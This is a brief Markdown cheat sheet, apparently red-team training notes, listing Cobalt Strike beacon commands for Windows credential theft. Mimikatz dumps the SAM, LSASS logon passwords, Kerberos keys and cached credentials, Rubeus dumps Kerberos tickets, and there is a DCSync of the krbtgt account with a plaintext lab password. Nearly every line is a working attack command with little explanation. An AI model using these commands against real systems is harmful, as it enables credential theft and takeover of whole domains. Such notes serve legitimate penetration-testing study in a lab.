# Credential Theft

### "!" symbol is used to run command in elevated context of System User
### "@" symbol is used to impersonate beacon thread token

# Dump the local SAM database 

    beacon> mimikatz !lsadump::sam

# Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users

    beacon> mimikatz !sekurlsa::logonpasswords

# Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)

    beacon> mimikatz !sekurlsa::ekeys

# Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)

    beacon> mimikatz !lsadump::cache

# List the kerberos tickets cached in current logon session or all logon session (privileged session)

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump the TGT Ticket from given Logon Session (LUID)

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt

# DC Sync

    beacon> make_token DEV\nlamb F3rrari
    beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# Dump krbtgt hash from DC (locally)

    beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
